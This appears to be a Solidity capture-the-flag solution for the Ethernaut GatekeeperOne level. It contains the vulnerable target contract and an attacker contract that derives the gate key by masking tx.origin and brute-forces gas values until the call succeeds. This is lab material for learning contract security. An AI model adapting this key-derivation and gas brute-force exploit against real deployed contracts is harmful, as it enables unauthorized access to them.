// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Make it past the gatekeeper and register as an entrant to pass this level.

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract BreakGateKeeperOne {

    GatekeeperOne private immutable target;
    uint32 private gatekey;

    constructor(address payable _target) { 
        target = GatekeeperOne(payable(_target));
    }

    /*
     SOLVING REQUIREMENTS

     ## Gate 3

     $ Requirement-1
     bytes8 _gateKey => 0x B1 B2 B3 B4 B5 B6 B7 B8
     uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
     1 byte = 8 bits
     uint64 => numerical_value(0x B1 B2 B3 B4 B5 B6 B7 B8) , without losing any data
     uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
     uint16(uint64(_gateKey)) => 0x B7 B8
     which implies 
     :: B5 B6 = 00 00
     :: uint32(uint64(_gateKey)) => 0x 00 00 B7 B8

     $ Requirement-2
     uint32(uint64(_gateKey)) != uint64(_gateKey)
     uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
     uint64(_gateKey) => 0x B1 B2 B3 B4 B5 B6 B7 B8
     which implies
     :: B1 B2 B3 B4 != 00 00 00 00

     $ Requirement-3
     uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
     LHS => 0x B5 B6 B7 B8
     tx.orgin => address => 20 bytes
     uint160(tx.orgin) => numerical_value(address)
     uint16(uint160(tx.origin)) => last 2 bytes of uint160(tx.orgin)
     LHS => 0x B5 B6 B7 B8 == last 2 bytes of uint160(tx.orgin)
     from Requirement-1 => B5 B6 = 00 00
     0x B7 B8 == last 2 bytes of uint160(tx.orgin)

     ## Gate 2

     total gas = (8191 * k) + i, k= abitary number
     total gas = (8191 * 3) + i
     brute force the value of i

     */

    function breakit() external {
          // B5 B6 = 00 00
          // B1 B2 B3 B4 != 00 00 00 00 which can also mean that they can be the first 4 bytes of tx.origin
          // B7 B8 == last 2 bytes of uint160(tx.orgin)
          // meaning B1 B2 B3 B4 B7 B8 are from tx.origin and B6 and B6 are zeroes
          // F in hexadecimal = 1111 in binary

          bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

          for(uint256 i=0; i<300; i++){
            uint256 totalgas = i + (8191*3);
            (bool result, ) = address(target).call{gas: totalgas}(
              abi.encodeWithSignature("enter(bytes8)", key)
            );

            if(result){
              break;
            }
          }
    }

}